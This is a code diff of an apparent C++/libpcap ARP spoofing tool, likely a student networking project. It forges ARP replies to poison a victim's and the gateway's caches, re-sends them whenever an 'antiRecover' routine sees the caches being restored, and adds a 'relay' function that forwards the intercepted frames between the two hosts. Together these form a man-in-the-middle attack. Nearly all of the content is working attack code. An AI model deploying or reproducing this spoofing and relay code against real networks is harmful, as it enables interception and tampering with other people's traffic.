@@ -12,6 +12,8 @@
 #include <sys/ioctl.h>
 #include <unistd.h>
 #include <thread>
+#include "mac.h"
+#include "ip.h"
 
 using namespace std;
 
@@ -30,10 +32,11 @@ void printByHexData(u_int8_t* printArr,int length);
 void printByMAC(u_int8_t *printArr, int length);
 void printLine();
 void sendARPReguest(char* device, char *sender_IP, u_int8_t* my_MAC, int print, ARPPacket ARPRequest, pcap_t *pcd);
-void sendARPReply(ARPPacket *arpReply, int packeLen, pcap_t *pcd);
+void sendPacket(ARPPacket *arpReply, int packeLen, pcap_t *pcd);
 void getMyIP(char* device, u_int8_t* myIP);
 int  findARPReply(char* device, char* rule, u_int8_t *retnMAC);
 int antiRecover(char *device, pcap_t *pcd, char *errBuf, ARPPacket *ARPRecover, u_int8_t *senderMAC, u_int8_t *targetMAC, u_int8_t *senderIP, u_int8_t *targetIP);
+void relay(char *device, pcap_t *pcd, char *errBuf, u_int8_t *senderMAC, u_int8_t *targetMAC);
 
 /*send_arp <dev> <sender ip> <target ip>*/
 
@@ -63,7 +66,7 @@ int main(int argc, char *argv[])
 
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *pcd;
-    if((pcd = pcap_open_live(device,BUFSIZ,PROMISCUOUS,0,errbuf))==NULL)//modify nonpromiscuous -> promiscuous
+    if((pcd = pcap_open_live(device,BUFSIZ,NONPROMISCUOUS,0,errbuf))==NULL)//promiscuous
     {
         perror(errbuf);
         exit(1);
@@ -118,42 +121,46 @@ int main(int argc, char *argv[])
 
 
 
-    sendARPReply(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet
+    sendPacket(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet
 
 
-    struct ARPPacket ARPToTarget; //to fake gateway
+    struct ARPPacket ARPToTargetReply; //to fake gateway
 
     //init ETHER_HEADER
-    memcpy(ARPToTarget.eh.ether_dhost,target_Mac,ETHER_ADDR_LEN);
-    memcpy(ARPToTarget.eh.ether_shost,my_Mac,ETHER_ADDR_LEN);
-    ARPToTarget.eh.ether_type=htons(ETHERTYPE_ARP);
+    memcpy(ARPToTargetReply.eh.ether_dhost,target_Mac,ETHER_ADDR_LEN);
+    memcpy(ARPToTargetReply.eh.ether_shost,my_Mac,ETHER_ADDR_LEN);
+    ARPToTargetReply.eh.ether_type=htons(ETHERTYPE_ARP);
 
     //init ARP_HEADER
-    memcpy(ARPToTarget.arp.arp_sha,my_Mac,ETHER_ADDR_LEN);
-    inet_pton(AF_INET,senderIp,ARPToTarget.arp.arp_spa);
-    memcpy(ARPToTarget.arp.arp_tha,target_Mac,ETHER_ADDR_LEN);
-    inet_pton(AF_INET,targetIp,ARPToTarget.arp.arp_tpa);
+    memcpy(ARPToTargetReply.arp.arp_sha,my_Mac,ETHER_ADDR_LEN);
+    inet_pton(AF_INET,senderIp,ARPToTargetReply.arp.arp_spa);
+    memcpy(ARPToTargetReply.arp.arp_tha,target_Mac,ETHER_ADDR_LEN);
+    inet_pton(AF_INET,targetIp,ARPToTargetReply.arp.arp_tpa);
 
-    ARPToTarget.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
-    ARPToTarget.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
-    ARPToTarget.arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
-    ARPToTarget.arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
-    ARPToTarget.arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)
+    ARPToTargetReply.arp.ea_hdr.ar_hrd=ntohs(1);             //set Hardware Type Ethernet
+    ARPToTargetReply.arp.ea_hdr.ar_pro=ntohs(ETHERTYPE_IP);  //set protocol type IP
+    ARPToTargetReply.arp.ea_hdr.ar_hln=6;             //set Hardware Size 6 -> MAC address size
+    ARPToTargetReply.arp.ea_hdr.ar_pln=4;             //set Protocol length 4 -> 4 IP address size
+    ARPToTargetReply.arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)
 
+
+
+    sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd);//send to gateway request
 
 
     struct ARPPacket ARPRecover;
     int recoverCount=0;
+
     while(true)
     {
         if(antiRecover(device,pcd,errbuf,&ARPRecover,sender_Mac,target_Mac,ARPReply.arp.arp_tpa,ARPReply.arp.arp_spa))
         {
-            sendARPReply(&ARPToTarget,sizeof(struct ARPPacket),pcd);//send to gateway
-            cout<<"antiRecover "<<++recoverCount<<"times worked!!"<<endl;
-            sendARPReply(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet
-
+                cout<<"antiRecover type "<<++recoverCount<<"times worked!!"<<endl;
+                sendPacket(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet
         }
     }
+
+
 
     return 0;
 }
@@ -306,7 +313,7 @@ void sendARPReguest(char *device, char *senderIP,u_int8_t* my_MAC,int print,ARPP
 
 }
 
-void sendARPReply(ARPPacket *ARPReply,int packetLen,pcap_t* pcd)
+void sendPacket(ARPPacket *ARPReply,int packetLen,pcap_t* pcd)
 {
 
 
@@ -425,7 +432,7 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
     const u_char *pkt_data;
     struct pcap_pkthdr *pktHeader;
     int valueOfNextEx;
-    u_int8_t broadcast[]={0xff,0xff,0xff,0xff,0xff,0xff};
+
     while(true)
     {
 
@@ -437,33 +444,27 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
             case 1:
 
                 ARPRecover=(struct ARPPacket *)pkt_data;
-                printByHexData((uint8_t*)ARPRecover,sizeof(struct ARPPacket));
+                if(ntohs(ARPRecover->eh.ether_type)==ETHERTYPE_ARP) //next packet ARP
+                {
 
-                //senderPC -> gateway packet
+                    //senderPC -> gateway
+                    Mac sha;
+                    Ip  spa;
+                    sha=ARPRecover->arp.arp_sha;
+                    spa=ARPRecover->arp.arp_spa;
 
-                if(memcmp(ARPRecover->eh.ether_dhost,broadcast,sizeof(ARPRecover->eh.ether_dhost))==0)//if ether_dhost==BROADCAST
-                    if(memcmp(ARPRecover->eh.ether_shost,senderMAC,sizeof(ARPRecover->eh.ether_shost))==0)//if ether_shost==senderMAC
-                        if(memcmp(ARPRecover->arp.arp_sha,senderMAC,sizeof(ARPRecover->arp.arp_sha))==0)//if arp_sha== senderMAC
-                             if(memcmp(ARPRecover->arp.arp_spa,senderIP,sizeof(ARPRecover->arp.arp_spa))==0)//if arp_spa==senderIP
-                                  if(memcmp(ARPRecover->arp.arp_tpa,targetIP,sizeof(ARPRecover->arp.arp_tpa))==0)//if arp_tpa==targetIP
-                                        return 1;
+                    if(sha==senderMAC)
+                        if(spa==senderIP)
+                            return 1;
 
 
-                //gateway -> senderPC Packet
-                if(memcmp(ARPRecover->eh.ether_dhost,broadcast,sizeof(ARPRecover->eh.ether_dhost))==0)//if ether_dhost==BROADCAST
-                    if(memcmp(ARPRecover->eh.ether_shost,targetMAC,sizeof(ARPRecover->eh.ether_shost))==0)//if ether_shost==targetMAC
-                        if(memcmp(ARPRecover->arp.arp_sha,targetMAC,sizeof(ARPRecover->arp.arp_sha))==0)//if arp_sha== targetMAC
-                             if(memcmp(ARPRecover->arp.arp_spa,targetIP,sizeof(ARPRecover->arp.arp_spa))==0)//if arp_spa==targetIP
-                                    if(memcmp(ARPRecover->arp.arp_tpa,senderIP,sizeof(ARPRecover->arp.arp_tha))==0)//if arp_tpa==senderIP
-                                        return 1;
+                    //gateway -> senderPC
 
-                //gateway -> senderPC(reply)
-                if(memcmp(ARPRecover->eh.ether_dhost,senderMAC,sizeof(ARPRecover->eh.ether_dhost))==0)
-                    if(memcmp(ARPRecover->eh.ether_shost,targetMAC,sizeof(ARPRecover->eh.ether_shost))==0)
-                        if(memcmp(ARPRecover->arp.arp_sha,targetMAC,sizeof(ARPRecover->arp.arp_sha))==0)
-                             if(memcmp(ARPRecover->arp.arp_spa,senderIP,sizeof(ARPRecover->arp.arp_spa))==0)
-                                  if(memcmp(ARPRecover->arp.arp_tpa,targetIP,sizeof(ARPRecover->arp.arp_tpa))==0)
-                                        return 1;
+                    if(sha==targetMAC)
+                        if(spa==targetIP)
+                            return 1;
+                }
+
                  break;
             case 0:
                 cout<<"need a sec.. to packet capture"<<endl;
@@ -481,3 +482,57 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
     }
 
 }
+
+void relay(char* device, pcap_t* pcd,char* errBuf, u_int8_t* senderMAC,u_int8_t* targetMAC)
+{
+    bpf_u_int32 netp,maskp;
+
+    if(pcap_lookupnet(device,&netp,&maskp,errBuf)<0)
+    {
+        perror(errBuf);
+        exit(1);
+    }
+
+    struct pcap_pkthdr *pkthdr;
+    const u_int8_t* pktdata;
+    int valueOfNextEx=0;
+    struct ARPPacket* packet;
+    while(true)
+    {
+
+        //need a thread
+        valueOfNextEx=pcap_next_ex(pcd,&pkthdr,&pktdata);
+
+        switch (valueOfNextEx)
+        {
+            case 1:
+            //need to avoid arp packet
+                 packet=(struct ARPPacket *)pktdata;
+
+                 //gateway -> senderPC
+                 if(memcmp(packet->eh.ether_dhost,senderMAC,ETHER_ADDR_LEN)==0)
+                     if(memcmp(packet->eh.ether_shost,targetMAC,ETHER_ADDR_LEN)==0)
+                            pcap_sendpacket(pcd,pktdata,pkthdr->len);
+
+
+                 if(memcmp(packet->eh.ether_dhost,targetMAC,ETHER_ADDR_LEN)==0)
+                     if(memcmp(packet->eh.ether_shost,senderMAC,ETHER_ADDR_LEN)==0)
+                            pcap_sendpacket(pcd,pktdata,pkthdr->len);
+                 break;
+            case 0:
+                cout<<"need a sec.. to packet capture"<<endl;
+                continue;
+            case -1:
+                perror("pcap_next_ex function has an error!!");
+                exit(1);
+
+            case -2:
+                cout<<"the packet have reached EOF!!"<<endl;
+                exit(0);
+            default:
+                break;
+            }
+    }
+
+}
+
